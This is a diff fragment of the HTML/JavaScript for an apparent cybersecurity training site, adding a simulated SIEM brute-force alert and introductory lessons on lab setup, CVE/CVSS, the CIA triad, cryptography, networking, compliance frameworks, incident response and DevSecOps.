+          <tr><td style="padding:8px;">10:00:01</td><td style="padding:8px;">admin</td><td style="padding:8px;">10.0.0.5</td><td style="padding:8px;">Login</td><td style="padding:8px;">SUCCESS</td></tr>
+          <tr><td style="padding:8px;">10:05:12</td><td style="padding:8px;">admin</td><td style="padding:8px;">45.33.21.9</td><td style="padding:8px;">Login</td><td style="padding:8px;">FAILED</td></tr>
+          <tr><td style="padding:8px;">10:05:14</td><td style="padding:8px;">admin</td><td style="padding:8px;">45.33.21.9</td><td style="padding:8px;">Login</td><td style="padding:8px;">FAILED</td></tr>
+          <tr><td style="padding:8px;">10:05:16</td><td style="padding:8px;">admin</td><td style="padding:8px;">45.33.21.9</td><td style="padding:8px;">Login</td><td style="padding:8px;">FAILED</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <button class="term-btn" style="margin-top:15px; border-color:var(--red); color:var(--red);" onclick="runSIEMRule()">Run Correlation Rule</button>
+    <button class="term-btn" style="margin-top:15px; border-color:var(--acc); color:var(--acc);" onclick="completeModule('soc')">Mark as Complete</button></div>`;
+}
+function runSIEMRule() {
+  document.querySelectorAll('#siemLogs tr').forEach(r => r.style.background = 'rgba(255, 59, 92, 0.2)');
+  alert('ALERT TRIGGERED: Brute Force Attack Detected from 45.33.21.9');
+}
+
+// --- EXHAUSTIVE INFO MODULES DATA ---
+const INFO_DATA = {
+  "setup": `<h3>Where to Start & Installation</h3>
+    <p>To begin your journey in cybersecurity, you need a safe, isolated environment to practice without breaking real systems.</p>
+    <p><strong>1. Virtualization Software:</strong> Download and install <code>VirtualBox</code> or <code>VMware Workstation Player</code>. These allow you to run "virtual computers" inside your real computer.</p>
+    <p><strong>2. Kali Linux:</strong> This is the industry-standard operating system for penetration testers. It comes pre-installed with hundreds of security tools. Download the Kali Linux VM image from the official Kali website and import it into your virtualization software.</p>
+    <p><strong>3. Vulnerable Targets:</strong> You need targets to attack. Download <code>Metasploitable 2</code> (an intentionally vulnerable Linux machine) and set up <code>DVWA</code> (Damn Vulnerable Web Application) to practice web attacks.</p>
+    <p><strong>4. Online Labs:</strong> Platforms like <code>TryHackMe</code> and <code>HackTheBox</code> provide guided, legal environments to hone your skills.</p>
+    <p><strong>Warning:</strong> NEVER scan or attack IPs that you do not own or do not have explicit, written permission to test. Doing so is illegal.</p>`,
+    
+  "cve": `<h3>CVE, CVSS & MITRE ATT&CK</h3>
+    <p>These three frameworks form the language of cybersecurity vulnerability management.</p>
+    <p><strong>CVE (Common Vulnerabilities and Exposures):</strong> This is a dictionary of publicly known cybersecurity vulnerabilities. Each vulnerability gets a unique ID (e.g., <code>CVE-2021-44228</code> is Log4Shell). This allows security professionals to reference the exact same bug globally.</p>
+    <p><strong>CVSS (Common Vulnerability Scoring System):</strong> A standardized scoring system from 0.0 to 10.0 indicating the severity of a vulnerability.</p>
+    <ul>
+      <li><strong>0.1 - 3.9 (Low):</strong> Minimal impact.</li>
+      <li><strong>4.0 - 6.9 (Medium):</strong> Significant impact but limited access or complexity.</li>
+      <li><strong>7.0 - 8.9 (High):</strong> Major impact, often allowing remote code execution or data breach.</li>
+      <li><strong>9.0 - 10.0 (Critical):</strong> Easily exploitable, massive impact, often wormable (spreads automatically).</li>
+    </ul>
+    <p><strong>MITRE ATT&CK:</strong> A globally accessible knowledge base of adversary tactics and techniques. It maps out the stages of an attack (e.g., Initial Access, Execution, Persistence, Exfiltration) and lists the specific methods attackers use in each stage.</p>
+    <p><strong>How to get CVEs from Scanners:</strong> Vulnerability scanners like Nessus, OpenVAS, and Nmap NSE scripts probe targets for known flaws. When a flaw is found, the scanner outputs the associated CVE ID and CVSS score in its report, allowing you to look up the exact exploit and patch.</p>`,
+
+  "vuln_scanning_info": `<h3>Vulnerability Scanning Concepts</h3>
+    <p>Vulnerability scanning is the automated process of inspecting systems for known security flaws.</p>
+    <p><strong>Types of Scanners:</strong></p>
+    <ul>
+      <li><strong>Network Scanners (Nessus, OpenVAS, Nmap):</strong> Scan IP ranges over the network to find open ports and vulnerable services.</li>
+      <li><strong>Web Scanners (Nikto, Burp Suite, OWASP ZAP):</strong> Crawl web applications looking for flaws like SQLi, XSS, and outdated software.</li>
+      <li><strong>Database Scanners:</strong> Look for misconfigurations and weak passwords in SQL databases.</li>
+    </ul>
+    <p><strong>How it works:</strong> The scanner sends probes to the target. Based on the response (or lack thereof), it compares the data against a massive database of known vulnerabilities (CVEs) and generates a report.</p>`,
+
+  "cia": `<h3>The CIA Triad</h3>
+    <p>The foundational model of cybersecurity. Every security control aims to protect one or more of these three principles.</p>
+    <ul>
+      <li><strong>Confidentiality:</strong> Preventing unauthorized disclosure of data. <br><em>Examples:</em> Encrypting hard drives, using HTTPS, enforcing strict access controls (RBAC).</li>
+      <li><strong>Integrity:</strong> Preventing unauthorized modification of data. <br><em>Examples:</em> Using SHA-256 hashing to verify file integrity, implementing digital signatures, using version control.</li>
+      <li><strong>Availability:</strong> Ensuring data and systems are available to authorized users when needed. <br><em>Examples:</em> Implementing load balancers, DDoS protection, regular backups, and redundant power supplies.</li>
+    </ul>`,
+
+  "aaa": `<h3>AAA (Authentication, Authorization, Accounting)</h3>
+    <p>A framework for intelligently controlling access to computer resources, enforcing policies, and auditing usage.</p>
+    <ul>
+      <li><strong>Authentication (Who are you?):</strong> Verifying the identity of a user or system. This is done via passwords, biometrics, smart cards, or multi-factor authentication (MFA).</li>
+      <li><strong>Authorization (What can you do?):</strong> Determining what resources an authenticated user is allowed to access. Implemented via Access Control Lists (ACLs) or Role-Based Access Control (RBAC).</li>
+      <li><strong>Accounting (What did you do?):</strong> Tracking user activity for billing, auditing, and forensic purposes. Logs are sent to a central server (e.g., via RADIUS or TACACS+).</li>
+    </ul>`,
+
+  "crypto": `<h3>Cryptography & Hashing</h3>
+    <p>The science of securing information through mathematics.</p>
+    <p><strong>Symmetric Encryption:</strong> Uses the same key for both encryption and decryption. <br><em>Examples:</em> AES (Advanced Encryption Standard), DES (Data Encryption Standard - obsolete). <br><em>Use case:</em> Encrypting hard drives or large databases (fast).</p>
+    <p><strong>Asymmetric Encryption:</strong> Uses a pair of keys: a public key (shared with everyone) and a private key (kept secret). <br><em>Examples:</em> RSA, ECC (Elliptic Curve Cryptography). <br><em>Use case:</em> Secure key exchange over the internet (HTTPS/SSL).</p>
+    <p><strong>Hashing:</strong> A one-way mathematical function that turns data into a fixed-length string of characters. You cannot reverse a hash. <br><em>Examples:</em> SHA-256, MD5 (broken). <br><em>Use case:</em> Storing passwords securely. When a user logs in, the system hashes their input and compares it to the stored hash.</p>`,
+
+  "networking": `<h3>OSI Model & Protocols</h3>
+    <p>The OSI (Open Systems Interconnection) model is a conceptual framework that standardizes networking into 7 layers.</p>
+    <ul>
+      <li><strong>Layer 7 (Application):</strong> Interfaces directly with the end-user. <em>Protocols:</em> HTTP (web browsing), DNS (domain name resolution), FTP (file transfer), SSH (secure shell).</li>
+      <li><strong>Layer 6 (Presentation):</strong> Translates, encrypts, and compresses data. <em>Protocols:</em> SSL/TLS (encryption), JPEG, ASCII.</li>
+      <li><strong>Layer 5 (Session):</strong> Opens, manages, and terminates sessions between applications. <em>Protocols:</em> Sockets, NetBIOS.</li>
+      <li><strong>Layer 4 (Transport):</strong> Provides reliable or unreliable data delivery. <em>Protocols:</em> TCP (reliable, connection-oriented), UDP (fast, connectionless).</li>
+      <li><strong>Layer 3 (Network):</strong> Determines the best path for data (routing). <em>Protocols:</em> IP (Internet Protocol), ICMP (Ping).</li>
+      <li><strong>Layer 2 (Data Link):</strong> Node-to-node data transfer on the same network. <em>Protocols:</em> Ethernet, ARP (maps IP to MAC addresses).</li>
+      <li><strong>Layer 1 (Physical):</strong> The physical hardware transmitting raw bits. <em>Examples:</em> Cables, switches, radio waves.</li>
+    </ul>`,
+
+  "nist": `<h3>NIST Cybersecurity Framework (CSF)</h3>
+    <p>A voluntary framework created by the National Institute of Standards and Technology to help organizations manage cybersecurity risk. It consists of 5 core functions:</p>
+    <ul>
+      <li><strong>Identify:</strong> Understand what assets you have (hardware, software, data) and the risks they face.</li>
+      <li><strong>Protect:</strong> Implement safeguards (firewalls, access controls, encryption) to protect those assets.</li>
+      <li><strong>Detect:</strong> Implement monitoring (SIEMs, IDS/IPS) to detect when an attack occurs.</li>
+      <li><strong>Respond:</strong> Create an Incident Response plan to contain and mitigate attacks.</li>
+      <li><strong>Recover:</strong> Restore systems from backups and return to normal operations after an incident.</li>
+    </ul>`,
+
+  "iso": `<h3>ISO 27001</h3>
+    <p>The international standard for Information Security Management Systems (ISMS). It provides a systematic approach to managing sensitive company information so that it remains secure.</p>
+    <p>It includes people, processes, and IT systems by applying a risk management process. It is often required by enterprises to prove they take security seriously before signing business contracts.</p>`,
+
+  "pci": `<h3>PCI-DSS (Payment Card Industry Data Security Standard)</h3>
+    <p>A mandatory standard for any organization that handles credit cards. It ensures that cardholder data is processed, stored, and transmitted securely.</p>
+    <p><strong>Key Requirements:</strong> Install and maintain a firewall, do not use default passwords, protect stored cardholder data (encryption), encrypt transmission over public networks, regularly test security systems, and maintain an Information Security Policy.</p>`,
+
+  "risk": `<h3>Risk Management</h3>
+    <p>Risk is the potential for loss or damage. In cybersecurity, risk is calculated as: <code>Risk = Threat x Vulnerability x Impact</code>.</p>
+    <p><strong>Risk Treatments:</strong></p>
+    <ul>
+      <li><strong>Mitigation:</strong> Reducing the risk by applying controls (e.g., patching a server).</li>
+      <li><strong>Transference:</strong> Shifting the risk to a third party (e.g., buying cybersecurity insurance).</li>
+      <li><strong>Acceptance:</strong> Acknowledging the risk but deciding the cost of fixing it is too high.</li>
+      <li><strong>Avoidance:</strong> Stopping the activity that causes the risk entirely.</li>
+    </ul>`,
+
+  "zero_trust": `<h3>Zero Trust Architecture</h3>
+    <p>Traditional security treated the internal network as "trusted" and the external internet as "untrusted". Once an attacker breached the perimeter, they could move freely. Zero Trust abandons this model.</p>
+    <p><strong>Core Principle:</strong> "Never trust, always verify." No user or device is trusted by default, even if they are inside the corporate network.</p>
+    <p><strong>Implementation:</strong> Requires strict identity verification (MFA) for every person and device trying to access resources. It relies heavily on micro-segmentation (dividing the network into small, secure zones) and least-privilege access.</p>`,
+
+  "ir": `<h3>Incident Response (PICERL)</h3>
+    <p>A structured approach to handling a security breach. The SANS Institute defines the PICERL process:</p>
+    <ul>
+      <li><strong>1. Preparation:</strong> Training teams, setting up tools, and writing playbooks before an attack happens.</li>
+      <li><strong>2. Identification:</strong> Detecting the incident via alerts (e.g., SIEM alerts on brute-force login) and determining its scope.</li>
+      <li><strong>3. Containment:</strong> Isolating infected machines from the network to stop the spread.</li>
+      <li><strong>4. Eradication:</strong> Removing the malware, deleting unauthorized accounts, and patching the vulnerability.</li>
+      <li><strong>5. Recovery:</strong> Restoring systems from clean backups and bringing them back online carefully.</li>
+      <li><strong>6. Lessons Learned:</strong> Writing a post-mortem report to improve defenses for the next time.</li>
+    </ul>`,
+
+  "containers": `<h3>Container Security (Docker/Kubernetes)</h3>
+    <p>Containers package applications and their dependencies together, ensuring they run consistently across environments. However, they introduce new security challenges.</p>
+    <p><strong>Key Security Practices:</strong></p>
+    <ul>
+      <li><strong>Scan Images:</strong> Use tools like Trivy or Clair to scan container images for known vulnerabilities before deployment.</li>
+      <li><strong>Non-Root User:</strong> Never run processes inside a container as the root user. If an attacker breaks out, they get root access to the host.</li>
+      <li><strong>Read-Only Filesystems:</strong> Make the container's filesystem read-only to prevent attackers from downloading malicious payloads.</li>
+      <li><strong>Network Policies:</strong> In Kubernetes, use Network Policies to restrict which containers can talk to each other.</li>
+    </ul>`,
+
+  "sast": `<h3>SAST (Static Application Security Testing)</h3>
+    <p>SAST analyzes source code <em>before</em> it is compiled. It looks for insecure coding patterns that could lead to vulnerabilities.</p>
+    <p><strong>Examples:</strong> SonarQube, Checkmarx, Veracode.</p>
+    <p><strong>What it finds:</strong> Hardcoded passwords, SQL injection flaws, use of outdated/unsafe functions. It is fast and catches bugs early in development.</p>`,
+
+  "cicd": `<h3>CI/CD Pipeline Security</h3>
+    <p>CI/CD (Continuous Integration/Continuous Deployment) automates the process of building, testing, and deploying code.</p>
+    <p><strong>Security Risks:</strong> If an attacker compromises the build server (e.g., Jenkins, GitLab CI), they can inject malicious code into every application the company builds.</p>
+    <p><strong>Defense:</strong> Secure the pipeline by restricting token permissions, scanning dependencies (SCA), running SAST/DAST tests in the pipeline, and ensuring the build server is patched and isolated.</p>`
+};
+
+function renderInfoModule(id, title) {
+  const content = INFO_DATA[id] || "<p>Content for this module is being updated.</p>";
+  ContentArea.innerHTML = `<div class="card">
+    <h3><i class="fas fa-book"></i> ${title}</h3>
+    ${content}
+    <button class="term-btn" style="margin-top:15px; border-color:var(--acc); color:var(--acc);" onclick="completeModule('${id}')">Mark as Complete</button>
+  </div>`;
+}
+
+// Init
+renderTree();
+</script>
+</body>
+</html>
